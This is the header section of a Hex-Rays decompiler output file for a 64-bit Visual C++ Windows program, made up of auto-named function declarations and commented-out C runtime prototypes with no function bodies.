/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

__int64 __fastcall sub_140001000(wchar_t *FileName); // idb
void *sub_140001930();
int sub_140001940(char *Buffer, char *Format, ...);
DWORD __fastcall StartAddress(const char *lpThreadParameter);
int __fastcall main(int argc, const char **argv, const char **envp);
_QWORD *sub_140002180();
__int64 sub_1400025E0(__int64 a1, ...);
__int64 sub_140002640(__int64 a1, __int64 a2, ...);
_QWORD *__fastcall sub_140002690(_QWORD *a1);
LPWSTR *__fastcall sub_140002BC0(const WCHAR *a1, _QWORD *a2);
_QWORD *__fastcall sub_140002FF0(const char *a1, _QWORD *a2);
_QWORD *sub_1400031A0();
void __fastcall sub_1400032D0(_QWORD *a1);
// void __fastcall __noreturn _report_rangecheckfailure(_QWORD, _QWORD, _QWORD, _QWORD); weak
// int __cdecl atexit(void (__cdecl *)());
__int64 __fastcall UserMathErrorFunction(struct _exception *a1);
void sub_140003C10();
char sub_140003C20();
__int64 __fastcall guard_check_icall_nop(); // weak
void *sub_140003C34();
void *sub_140003C64();
void *sub_140003C6C();
void sub_140003C74();
void sub_140003E6C();
void __fastcall sub_140003EA8();
// char *__cdecl strstr(const char *Str, const char *SubStr);
// char *__cdecl strchr(const char *Str, int Val);
// __vcrt_bool __cdecl _vcrt_uninitialize(__vcrt_bool Terminating);
// void *__cdecl memset(void *, int Val, size_t Size);
// wchar_t *__cdecl wcsrchr(const wchar_t *Str, wchar_t Ch);
// __int64 __fastcall NLG_Notify(_QWORD, _QWORD, _QWORD); weak
// __int64 _NLG_Return2(void); weak
// void *__cdecl memmove(void *, const void *Src, size_t Size);
__int64 __fastcall sub_1400052A0(__int64 a1, __int64 a2, __int64 a3, unsigned int a4);
// int __cdecl fclose(FILE *Stream);
__int64 __fastcall common_fseek(_QWORD, _QWORD, _QWORD); // weak
// int __cdecl fseek(FILE *Stream, int Offset, int Origin);
// int __cdecl rand();
// void __cdecl srand(unsigned int Seed);
// size_t __cdecl fwrite(const void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
// unsigned int *__cdecl _doserrno();
// int *__cdecl errno();
// FILE *__cdecl wfopen(const wchar_t *FileName, const wchar_t *Mode);
// FILE *__cdecl fopen(const char *FileName, const char *Mode);
void __cdecl j__free_base(void *Block);
__int64 __fastcall common_ftell<__int64>(_QWORD); // weak
__int64 __fastcall common_ftell<long>(_QWORD); // weak
// size_t __cdecl fread(void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
void *__cdecl j__malloc_base(size_t Size);
// int __cdecl wcsicmp(const wchar_t *String1, const wchar_t *String2);
// char *__cdecl strncpy(char *Destination, const char *Source, size_t Count);
// int __cdecl strnicmp(const char *String1, const char *String2, size_t MaxCount);
// __int64 __fastcall __crt_seh_guarded_call<int>::operator()<_lambda_a81aa23bb2c9577c1e55b9d0b57d9de4_,_lambda_9a20e10065b92b5193c3597a66cba9d4_ &,_lambda_cb3a421ff86d8a5f008440ee6b28fa9c_>(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall __crt_seh_guarded_call<int>::operator()<_lambda_a81aa23bb2c9577c1e55b9d0b57d9de4_,_lambda_9a20e10065b92b5193c3597a66cba9d4_ &,_lambda_cb3a421ff86d8a5f008440ee6b28fa9c_>(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall unknown_libname_3(_QWORD, _QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall unknown_libname_4(_QWORD, _QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall __crt_stdio_output::write_multiple_characters<__crt_stdio_output::stream_output_adapter<char>,char>(_QWORD, _QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall __crt_stdio_output::write_multiple_characters<__crt_stdio_output::stream_output_adapter<wchar_t>,char>(_QWORD, _QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(_QWORD, _QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<wchar_t>,char>(_QWORD, _QWORD, _QWORD, _QWORD); weak
char __fastcall sub_140007BA8(__int64 a1);
char __fastcall sub_140007C18(__int64 a1);
// __int64 __fastcall unknown_libname_9(_QWORD, _QWORD); weak
// __int64 __fastcall unknown_libname_10(_QWORD, _QWORD); weak
char __fastcall sub_140007DB8(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
char __fastcall sub_140007F34(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
char __fastcall sub_1400080B0(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
char __fastcall sub_140008254(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
char __fastcall sub_1400083F8(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
char __fastcall sub_140008674(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
char __fastcall sub_1400088F0(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
char __fastcall sub_140008BBC(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
// __int64 unknown_libname_11(void); weak
// __int64 unknown_libname_12(void); weak
// __int64 unknown_libname_13(void); weak
// __int64 unknown_libname_14(void); weak
// __int64 __fastcall unknown_libname_15(_QWORD, _QWORD); weak
// __int64 __fastcall unknown_libname_16(_QWORD, _QWORD); weak
char __fastcall sub_140009544(__int64 a1, unsigned int a2, char a3, __int64 a4);
// __int64 unknown_libname_17(void); weak
// __int64 unknown_libname_18(void); weak
// __int64 unknown_libname_19(void); weak
// __int64 __fastcall unknown_libname_20(_QWORD, _QWORD); weak
// __int64 __fastcall unknown_libname_21(_QWORD, _QWORD); weak
// __int64 __fastcall unknown_libname_22(_QWORD, _QWORD); weak
// __int64 __fastcall unknown_libname_23(_QWORD, _QWORD); weak
// __int64 __fastcall __crt_stdio_output::stream_output_adapter<char>::write_string(_DWORD, _DWORD, _DWORD, _DWORD, __int64); weak
// __int64 __fastcall __crt_stdio_output::stream_output_adapter<wchar_t>::write_string(_DWORD, _DWORD, _DWORD, _DWORD, __int64); weak
// __int64 __fastcall __crt_stdio_output::string_output_adapter<char>::write_string(_DWORD, _DWORD, _DWORD, _DWORD, __int64); weak
// __int64 __fastcall __crt_stdio_output::string_output_adapter<wchar_t>::write_string(_DWORD, _DWORD, _DWORD, _DWORD, __int64); weak
__int64 __fastcall sub_14000A0B0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5);
__int64 __fastcall sub_14000A13C(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5);
// int __cdecl _stdio_common_vsprintf(unsigned __int64 Options, char *Buffer, size_t BufferCount, const char *Format, _locale_t Locale, va_list ArgList);
// int __cdecl _stdio_common_vswprintf(unsigned __int64 Options, wchar_t *Buffer, size_t BufferCount, const wchar_t *Format, _locale_t Locale, va_list ArgList);
// __int64 __fastcall unknown_libname_24(_QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall __crt_strtox::parse_integer<unsigned long,__crt_strtox::c_string_character_source<char>>(struct __crt_locale_pointers *); idb
__int64 __fastcall sub_14000B3C8(__int64 a1);
__int64 sub_14000B584();
void __fastcall sub_14000B58C(int a1);
void __fastcall sub_14000B5B4(__int64 a1);
void *sub_14000B99C();
void *sub_14000B9E4();
// __int64 common_initialize_environment_nolock<char>(void); weak
// __int64 common_initialize_environment_nolock<wchar_t>(void); weak
// __int64 __fastcall unknown_libname_25(void *Block); idb
// __int64 initialize_environment_by_cloning_nolock<char>(void); weak
// __int64 initialize_environment_by_cloning_nolock<wchar_t>(void); weak
__int64 __fastcall sub_14000BEC8(void **a1);
__int64 __fastcall sub_14000BEE4(void **a1);
void __fastcall sub_14000C268(__int64 a1);
// void __cdecl __noreturn exit(int Code);
__int64 __fastcall sub_14000C2EC(_DWORD *a1);
// int __cdecl setmode(int FileHandle, int Mode);
int *sub_14000C55C();
void **sub_14000C564();
__int64 sub_14000C62C();
int *sub_14000C660();
int __fastcall sub_14000CA20(_onexit_t Function);
// int __cdecl register_onexit_function(_onexit_table_t *Table, _onexit_t Function);
__vcrt_bool sub_14000CB90();
// FILE *__cdecl _acrt_iob_func(unsigned int Ix);
void __fastcall sub_14000CE08(__int64 a1);
void __fastcall sub_14000CE14(__int64 a1);
// wchar_t *__cdecl wcsncpy(wchar_t *Destination, const wchar_t *Source, size_t Count);
__int64 __fastcall common_fgets<char>(_QWORD, _QWORD, _QWORD); // weak
__int64 __fastcall common_fgets<wchar_t>(_QWORD, _QWORD, _QWORD); // weak
// int __cdecl feof(FILE *Stream);
// int __cdecl ferror(FILE *Stream);
void *__cdecl j__calloc_base(size_t Count, size_t Size);
// int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);
void __fastcall sub_14000D35C(__int64 a1);
// void __cdecl invalid_parameter_noinfo();
// __int64 __fastcall __crt_seh_guarded_call<int>::operator()<_lambda_bfedae4ebbf01fab1bb6dcc6a9e276e0_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_237c231691f317818eb88cc1d5d642d6_>(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD); weak
__int64 __fastcall sub_14000D528(int a1);
// int __cdecl fileno(FILE *Stream);
// int __cdecl fflush(FILE *Stream);
__int64 __fastcall sub_1400107E8(__int64 a1, __int64 *a2);
__int64 __fastcall sub_14001081C(__int64 a1, __int64 *a2);
// int __cdecl tolower(int C);
// int __cdecl isdigit(int C);
// int __cdecl isspace(int C);
// int __cdecl isxdigit(int C);
// int __cdecl strtol(const char *String, char **EndPtr, int Radix);
// unsigned int __cdecl strtoul(const char *String, char **EndPtr, int Radix);
// __int64 __fastcall unknown_libname_27(_QWORD, _QWORD); weak
// __int64 _acrt_update_thread_multibyte_data(void); weak
void __fastcall sub_140013E18(int a1);
void __fastcall sub_140013E6C(int a1);
void __fastcall sub_1400147A0(int a1);
void __fastcall sub_140014884(int a1);
// __int64 _acrt_update_thread_locale_data(void); weak
char sub_140015498();
void __fastcall sub_140015588(__int64 a1);
// int __cdecl raise(int Signal);
// _crt_signal_t __cdecl signal(int Signal, _crt_signal_t Function);
// void __cdecl qsort(void *Base, size_t NumOfElements, size_t SizeOfElements, _CoreCrtNonSecureSearchSortCompareFunction CompareFunction);
HANDLE sub_1400197FC();
int sub_140019838();
__int64 __fastcall sub_14001B2F0(_OWORD *a1, __int64 a2);
__int64 __fastcall sub_14001B470(__int64 a1);
void __fastcall sub_14001B4E0(void *a1);
void *__fastcall sub_14001B520();
__int64 __fastcall sub_14001B550(unsigned int *a1, __int64 a2);
__int64 __fastcall sub_14001B600(__int64 a1);
__int64 __fastcall sub_14001B690(_DWORD *a1, int a2);
__int64 __fastcall sub_14001B750(__int64 a1, int a2);
__int64 __fastcall sub_14001B770(unsigned int *a1, __int64 a2, int *a3);
__int64 __fastcall sub_14001B7A0(_DWORD *a1, int *a2, __int64 a3, __int64 a4, void *Src, int a6);
__int64 __fastcall sub_14001BAD0(int *a1, char *a2, int *a3, char *a4, int a5);
__int64 __fastcall sub_14001BB00(char *a1, _BYTE *a2, int *a3);
__int64 __fastcall sub_14001BCA0(_DWORD *a1, int *a2, __int64 a3, __int64 a4, void *Src);
__int64 __fastcall sub_14001BCD0(int *a1, char *a2, int *a3, char *a4, int a5);
__int64 __fastcall sub_14001BF20(unsigned int *a1, __int64 a2, int *a3);
__int64 __fastcall sub_14001C050(_DWORD *a1, int *a2, __int64 a3, __int64 a4, void *Src);
__int64 __fastcall sub_14001C080(int *a1, char *a2, int *a3, char *a4, int a5);
__int64 __fastcall sub_14001C310(__int64 a1, __int64 a2, int a3);
_BOOL8 __fastcall sub_14001C360(__int64 a1);
void __fastcall sub_14001C380(__int64 a1, int a2);
__int64 __fastcall sub_14001C390(__int64 a1, __int64 a2);
__int64 __fastcall sub_14001C5A0(__int64 a1);
void __fastcall sub_14001C600(__int64 a1);
__int64 __fastcall sub_14001C6D0(_QWORD *a1);
__int64 __fastcall sub_14001C740(__int64 a1);
// __int64 __fastcall std::ios_base::width(std::ios_base *__hidden this); idb
// __int64 __fastcall std::ios_base::precision(std::ios_base *__hidden this); idb
__int64 __fastcall sub_14001C770(__int64 a1);
__int64 __fastcall sub_14001C780(__int64 a1);
__int64 __fastcall sub_14001C790(__int64 a1);
__int64 __fastcall sub_14001C7A0(__int64 a1, int a2, _QWORD *a3, int *a4);
__int64 sub_14001C7F0();
_QWORD *__fastcall sub_14001C810(int a1);
__int64 __fastcall sub_14001C880(__int64 a1, _BYTE *a2, __int64 a3, int *a4);
__int64 __fastcall sub_14001C920(__int64 a1);
__int64 __fastcall sub_14001C980(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_14001CA70(__int64 a1);
void __fastcall sub_14001CAD0(__int64 a1, int a2);
void __fastcall sub_14001CAE0(__int64 a1, int a2);
__int64 __fastcall sub_14001CAF0(__int64 **a1, __int64 *a2);
__int64 __fastcall sub_14001CB60(__int64 a1, _QWORD *a2);
_BOOL8 __fastcall sub_14001CBD0(__int64 a1);
__int64 __fastcall sub_14001CC10(__int64 *a1);
__int64 __fastcall sub_14001CE80(__int64 a1);
__int64 __fastcall sub_14001CF90(__int64 a1);
__int64 __fastcall sub_14001CFD0(__int64 a1, _BYTE *a2, int a3);
__int64 __fastcall sub_14001D0A0(__int64 a1, _BYTE *a2, unsigned __int64 a3);
__int64 __fastcall sub_14001D140(__int64 a1);
_BOOL8 __fastcall sub_14001D1A0(__int64 a1, int a2, __int64 a3);
__int64 __fastcall sub_14001D200(__int64 a1);
__int64 __fastcall sub_14001D240(__int64 a1, _DWORD *a2);
__int64 __fastcall sub_14001D290(__int64 a1, __int64 a2);
void __fastcall sub_14001D3C0(__int64 a1);
__int64 __fastcall sub_14001D460(__int64 a1);
__int64 __fastcall sub_14001D4B0(__int64 a1, __int64 a2);
__int64 __fastcall sub_14001D4F0(unsigned int *a1);
__int64 __fastcall sub_14001D500(__int64 a1);
_DWORD *__fastcall sub_14001D530();
__int64 __fastcall sub_14001D5F0(__int64 a1, __int64 a2, int a3);
_BOOL8 __fastcall sub_14001D670(__int64 a1, __int64 a2);
__int64 __fastcall sub_14001D6E0(__int64 a1, int a2);
__int64 __fastcall sub_14001D700(__int64 a1);
__int64 __fastcall sub_14001D740(int a1);
_BOOL8 __fastcall sub_14001D790(__int64 a1);
__int64 __fastcall sub_14001D7D0(__int64 a1, int a2, const char *a3, int a4);
void *__fastcall sub_14001D8E0(size_t a1);
void __fastcall sub_14001D930(void *a1);
void *__fastcall sub_14001D970(void *a1, size_t a2, __int64 a3, unsigned int a4);
void __fastcall sub_14001DA40(void *a1, __int64 a2, __int64 a3, unsigned int a4);
void *__fastcall sub_14001DAC0(void *a1, size_t a2, size_t a3, __int64 a4, unsigned int a5);
__int64 (__fastcall *__fastcall sub_14001DBF0(_QWORD *a1, __int64 (__fastcall **a2)(), _QWORD *a3))();
void *__fastcall sub_14001DC20(size_t a1);
_QWORD *__fastcall sub_14001DCA0(__int64 *a1, __int64 a2, _QWORD *a3, int *a4);
_QWORD *__fastcall sub_14001DDB0(__int64 *a1, _BYTE *a2, _QWORD *a3, int *a4);
__int64 __fastcall sub_14001DE30(__int64 a1, _QWORD *a2, int a3, __int64 a4, int *a5);
__int64 __fastcall sub_14001DEA0(__int64 a1, _QWORD *a2, int a3, int *a4);
void __fastcall sub_14001DF90();
_BOOL8 __fastcall sub_14001E0C0(int a1, __int64 *a2);
_BOOL8 sub_14001E450();
_BOOL8 sub_14001E480();
__int64 sub_14001E4B0();
__int64 sub_14001E4F0();
__int64 sub_14001E570();
__int64 sub_14001E590();
void sub_14001E5D0();
void sub_14001E600();
void sub_14001E630();
void sub_14001E660();
void sub_14001E690();
_BOOL8 sub_14001E6C0();
void sub_14001E6F0();
void sub_14001E700();
void sub_14001E730();
__int64 __fastcall sub_14001E740(char a1);
void __fastcall sub_14001E7D0(_DWORD *a1);
void sub_14001E820();
_BOOL8 __fastcall sub_14001E840(unsigned int *a1);
_BOOL8 __fastcall sub_14001E8A0(unsigned int *a1);
__int64 __fastcall sub_14001E950(__int64 a1);
__int64 __fastcall sub_14001E990(__int64 a1);
void __fastcall sub_14001E9D0();
__int64 __fastcall sub_14001EA10(_DWORD *a1, __int64 *a2);
__int64 __fastcall sub_14001EB00(__int64 *a1);
__int64 *__fastcall sub_14001EB80(unsigned int a1, __int64 a2, __int64 a3, unsigned int a4);
__int64 __fastcall sub_14001EC20(_DWORD *a1, __int64 *a2);
__int64 __fastcall sub_14001ED40(__int64 *a1);
void __fastcall sub_14001EDC0(__int64 a1, __int64 a2);
__int64 __fastcall sub_14001EDE0(DWORD a1, int a2, __FrameHandler3::TryBlockMap *a3);
__int64 __fastcall sub_14001EE20(_DWORD *a1);
__int64 __fastcall sub_14001EE90(_BYTE *a1, __int64 a2);
__int64 __fastcall sub_14001F1B0(_DWORD *a1);
__int64 __fastcall sub_14001F220(__int64 a1, unsigned int *a2, size_t a3);
void __fastcall sub_14001F350(int *a1, unsigned int *a2, __int64 a3);
__int64 __fastcall sub_140020440(__int64 *a1, int a2, int a3, unsigned int a4, unsigned int a5, __int64 a6);
_QWORD *__fastcall sub_140020560(__int64 a1);
void __fastcall sub_140020670(_QWORD *a1);
// __int64 __fastcall _except_get_jumpbuf_sp(_QWORD); weak
void *__fastcall sub_1400206E0(__int64 a1, unsigned int a2, char *a3);
_QWORD *__fastcall sub_140020770(__int64 a1, __int64 a2);
_QWORD *__fastcall sub_140020790(unsigned int a1, __int64 a2);
// void __fastcall std::swfun(struct std::ios_base *, __int64); idb
__int64 __fastcall sub_1400207C0(__int64 a1, __int64 a2, _BYTE *a3);
__int64 __fastcall sub_140020820(int a1);
void __fastcall sub_1400208B0(_BYTE *a1);
_QWORD *__fastcall sub_1400208E0(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_140020A60(_DWORD **a1, _DWORD **a2);
__int64 __fastcall sub_140020A70(__int64 *a1, __int64 a2, _QWORD *a3);
__int64 __fastcall sub_140020BF0(__int64 *a1);
__int64 __fastcall sub_140020C80(__int64 a1, _DWORD *a2);
__int64 __fastcall sub_140020E90(__int64 *a1, __int64 a2, _QWORD *a3, __int64 a4, __int64 a5);
__int64 __fastcall sub_140020FE0(__int64 *a1);
__int64 __fastcall sub_140021070(__int64 *a1, __int64 a2, _QWORD *a3, __int64 a4, __int64 a5);
__int64 __fastcall sub_1400211C0(__int64 *a1);
__int64 __fastcall sub_140021240(_DWORD *a1);
__int64 __fastcall sub_1400212D0(__int64 *a1);
void __fastcall sub_140021350(__int64 *a1);
__int64 __fastcall sub_140021440(__int64 a1, __int64 a2, int *a3);
__int64 __fastcall sub_140021650(__int64 a1, __int64 a2);
__int64 *__fastcall sub_1400218A0(__int64 *a1);
void __fastcall sub_140021910(__int64 *a1);
// struct _xDISPATCHER_CONTEXT *__fastcall __FrameHandler3::TryBlockMap::getpDC(__FrameHandler3::TryBlockMap *__hidden this); idb
// __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD); weak
__int64 __fastcall sub_140021A00(__int64 a1);
_BOOL8 __fastcall sub_140021A10(__int64 a1, __int64 a2);
__int64 __fastcall sub_140021A60(__int64 a1);
__int64 __fastcall sub_140021AB0(__int64 a1);
__int64 __fastcall sub_140021B00(__int64 a1);
__int64 __fastcall sub_140021B10(__int64 a1);
__int64 __fastcall sub_140021B60(__int64 a1);
__int64 __fastcall sub_140021B70(__int64 a1);
__int64 __fastcall sub_140021B80(__int64 a1);
__int64 __fastcall sub_140021B90(__int64 a1);
__int64 __fastcall sub_140021BD0(__int64 a1);
_QWORD *__fastcall sub_140021BE0(__int64 a1);
__int64 __fastcall sub_140021D20(__int64 a1);
void __fastcall sub_140021D70(__int64 a1, int a2);
__int64 __fastcall sub_140021D80(__int64 a1);
__int64 __fastcall sub_140021DD0(__int64 a1);
void __fastcall sub_140021E20(__int64 a1, int a2);
__int64 __fastcall sub_140021E30(__int64 *a1, _QWORD *a2, __int64 a3, __int64 a4);
void __fastcall sub_140021F30(__int64 a1, int a2);
__int64 __fastcall sub_140021F40(__int64 a1, const void *a2, size_t a3);
__int64 __fastcall sub_140022000(__int64 a1);
__int64 __fastcall sub_140022010(__int64 a1, _QWORD *a2, _QWORD *a3, _QWORD *a4);
void __fastcall sub_140022090(void *a1);
__int64 __fastcall sub_1400220E0(__int64 a1, _QWORD *a2, _QWORD *a3);
__int64 __fastcall sub_140022150(_QWORD *a1, _QWORD *a2);
__int64 __fastcall sub_1400221E0(__int64 a1, _QWORD *a2, _QWORD *a3);
void *__fastcall sub_140022250(_QWORD *a1, __int64 *a2);
void __fastcall sub_1400222C0(void *a1);
__int64 __fastcall sub_140022300(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_140022380(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_140022400(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_140022480(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_140022500(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_140022580(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_140022600(__FrameHandler3::TryBlockMap *a1, _QWORD *a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6);
_QWORD *__fastcall sub_140022670(__int64 *a1);
__int64 __fastcall sub_140022770(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_1400227F0(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_1400228F0(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_1400229F0(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_140022A70(__int64 *a1, unsigned __int64 a2, __int64 a3);
void __fastcall sub_140022B10(__int64 a1);
__int64 __fastcall sub_140022B60(__int64 a1);
__int64 __fastcall sub_140022B90(__int64 a1);
__int64 __fastcall sub_140022C30(__int64 *a1, char *a2);
_WORD *__fastcall sub_140022CC0(__int64 a1);
__int64 __fastcall sub_140022F40(__int64 *a1, char *a2);
__int64 __fastcall sub_140023120(__int64 *a1, _BYTE *a2);
__int64 __fastcall sub_140023320(__int64 a1, __int64 a2);
__int64 __fastcall sub_140023440(__int64 a1, __int64 a2);
__int64 __fastcall sub_140023460(char *a1, __int64 a2, __int64 a3);
void __fastcall __noreturn sub_1400234A0(const char *a1, const char *a2, __int64 a3);
__int64 sub_1400234E0();
int sub_140023670(char *a1, ...);
int __fastcall sub_140023980(_BYTE *a1);
void __fastcall sub_1400239A0(char *a1);
void sub_140023A40(int a1, ...);
void __fastcall sub_140023A70(int a1, __int64 a2);
void sub_140023B90();
void __fastcall sub_140023C40(unsigned int a1, char *a2, unsigned __int64 a3);
__int64 __fastcall sub_140023E40(int a1);
__int64 __fastcall sub_140023EE0(_QWORD *a1, _DWORD *a2, _QWORD *a3, _DWORD *a4);
__int64 sub_140024020();
char *sub_140024090();
__int64 __fastcall sub_140024150(int a1);
__int64 sub_1400241F0();
__int64 __fastcall sub_140024410(int a1, _DWORD *a2);
__int64 sub_140024460();
__int64 sub_1400244B0();
__int64 sub_1400244F0();
__int64 __fastcall sub_140024610(int a1, __int16 a2, __int16 a3, __int64 a4, int a5);
__int64 __fastcall sub_140024730(int a1);
void __fastcall sub_140024820(__int64 a1, int a2);
__int64 sub_1400248C0();
__int64 __fastcall sub_140024900(int a1, _DWORD *a2);
__int64 sub_1400249B0();
_DWORD *sub_140024A80();
void sub_140024AC0();
void sub_140024B00();
__int64 sub_140024B40();
__int64 sub_140024B70();
__int64 __fastcall sub_140024BE0(int a1, _DWORD *a2);
__int64 __fastcall sub_140024C80(_DWORD *a1, _DWORD *a2);
__int64 __fastcall sub_140024C90(_DWORD *a1);
__int64 __fastcall sub_140024CD0(__int64 a1);
// __int64 __fastcall __crt_stdio_input::format_string_parser<wchar_t>::scanset(_QWORD); weak
__int64 __fastcall sub_140024CF0(__int64 a1);
__int64 __fastcall sub_140024D00(__int64 a1);
// unsigned int __fastcall __FrameHandler3::TryBlockMap::getNumTryBlocks(__FrameHandler3::TryBlockMap *__hidden this); idb
__int64 __fastcall sub_140024D20(__int64 a1);
__int64 __fastcall sub_140024D30(__int64 a1);
__int64 __fastcall sub_140024D40(__int64 a1);
__int64 __fastcall sub_140024D50(__int64 a1);
void __fastcall sub_140024D60(__int64 a1, int a2);
void __fastcall sub_140024D70(__int64 a1, int a2);
__int64 __fastcall sub_140024D80(__int64 a1, unsigned int a2);
__int64 __fastcall sub_140024D90(__int64 a1, __int64 a2);
__int64 __fastcall sub_140024E00(__int64 a1, __int64 a2);
__int64 __fastcall sub_140024EA0(__int64 a1);
__int64 __fastcall sub_140024EB0(__int64 a1);
__int64 __fastcall sub_140024EC0(_BYTE *a1, __int64 a2);
__int64 __fastcall sub_140024F50(_BYTE *a1, __int64 a2);
__int64 __fastcall sub_140024FD0(unsigned int *a1);
__int64 __fastcall sub_140025270(__int64 a1, __int64 a2, __int64 a3, unsigned int a4);
void __fastcall sub_140025290(__int64 a1, int a2);
__int64 __fastcall sub_1400252A0(__int64 a1);
void __fastcall sub_1400252B0(__int64 a1, int a2);
__int64 __fastcall sub_1400252C0(__int64 a1, unsigned int a2);
__int64 __fastcall sub_1400252D0(__int64 a1);
void __fastcall sub_1400252E0(void *a1);
_DWORD *__fastcall sub_140025310(int a1, int a2);
__int64 __fastcall sub_140025360(__int64 a1, int a2);
__int64 __fastcall sub_140025370(__int64 a1, __int64 a2);
__int64 __fastcall sub_140025380(__int64 a1, int a2);
__int64 __fastcall sub_140025390(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400253A0(__int64 a1, int a2);
__int64 __fastcall sub_1400253B0(__int64 a1, int a2);
__int64 __fastcall sub_1400253C0(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400253D0(__int64 a1);
__int64 (__fastcall **__fastcall sub_140025410(__int64 a1, unsigned int a2))();
__int64 __fastcall sub_140025460(__int64 a1, unsigned int a2);
__int64 (__fastcall **sub_1400254B0())();
__int64 (__fastcall **__fastcall sub_140025570(__int64 a1, unsigned int a2))();
__int64 __fastcall sub_1400255B0(__int64 a1);
__int64 sub_140025630();
_DWORD *sub_140025660();
void sub_1400256B0();
__int64 __fastcall sub_140025700(__int64 a1, unsigned int a2);
__int64 __fastcall sub_140025760(int a1);
__int64 __fastcall sub_140025780(__int64 a1);
__int64 __fastcall sub_1400257F0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140025800(__int64 a1);
__int64 sub_140025870();
__int64 __fastcall sub_140025890(__int64 a1);
__int64 __fastcall sub_140025980(__int64 a1);
__int64 __fastcall sub_140025A60(__int64 a1, int a2);
__int64 __fastcall sub_140025B10(__int64 a1);
__int64 __fastcall sub_140025B60(_DWORD *a1);
_BOOL8 __fastcall sub_140025B70(int a1, int a2);
__int64 __fastcall sub_140025B80(unsigned int *a1);
__int64 __fastcall sub_140025BA0(_DWORD *a1);
void __fastcall sub_140025BE0(_DWORD *a1);
_DWORD *__fastcall sub_140025C10();
__int64 __fastcall sub_140025C50(_DWORD *a1);
__int64 __fastcall sub_140025C90(_DWORD *a1, void (*a2)(void));
__int64 __fastcall sub_140025CC0(unsigned int *a1, __int64 a2);
__int64 __fastcall sub_140025CE0(_DWORD *a1);
__int64 __fastcall sub_140025D20(_DWORD *a1);
__int64 __fastcall sub_140025D60(_DWORD *a1, int a2, _DWORD *a3);
__int64 __fastcall sub_140025D70(unsigned int a1, unsigned int **a2, unsigned int **a3);
void __fastcall sub_140025FB0(unsigned int a1, __int64 a2, __int64 *a3);
__int64 __fastcall sub_140026190(__int64 *a1, int a2);
__int64 __fastcall sub_1400261E0(unsigned int a1, int a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6);
char *__fastcall sub_140026350(unsigned int a1, __int64 a2, __int64 *a3);
__int64 __fastcall sub_140026520(unsigned int **a1, int a2, __int64 a3);
void __fastcall sub_140026600(void *a1);
void sub_140026630();
_DWORD *sub_1400266A0();
char *__fastcall sub_1400266E0(unsigned int a1);
void __fastcall sub_140026780(void *a1);
void *__fastcall sub_1400267B0();
void __fastcall sub_140026800(__int64 a1, __int64 a2, __int64 a3);
_BOOL8 __fastcall sub_140026810(__int64 a1, __int64 a2);
__int64 __fastcall sub_140026840(_BYTE *a1, int a2, __int64 a3);
__int64 __fastcall sub_1400269C0(__int64 a1, _BYTE *a2);
__int64 __fastcall sub_1400269E0(__int64 a1, _BYTE *a2, int a3);
void __fastcall sub_140026A10(__int64 *a1);
__int64 __fastcall sub_140026AB0(__int64 a1, __int64 *a2);
__int64 __fastcall sub_140026B40(__int64 a1, _DWORD *a2, _DWORD *a3, int a4);
_QWORD *__fastcall sub_140026E90(__int64 a1, __int64 a2);
_DWORD *__fastcall sub_140026F70(__int64 a1);
void __fastcall sub_140026FF0(_DWORD *a1);
__int64 __fastcall sub_140027070(__int64 a1, unsigned int a2);
__int64 __fastcall sub_140027080(_DWORD *a1);
__int64 __fastcall sub_1400270A0(__int64 a1, int a2);
_BOOL8 __fastcall sub_1400270E0(__int64 a1);
_BOOL8 __fastcall sub_1400270F0(__int64 a1);
_BOOL8 __fastcall sub_140027110(__int64 a1);
_BOOL8 __fastcall sub_140027130(__int64 a1, __int64 a2);
_BOOL8 __fastcall sub_140027160(__int64 a1);
__int64 __fastcall sub_140027170(__int64 a1, int a2);
_DWORD *__fastcall sub_140027200();
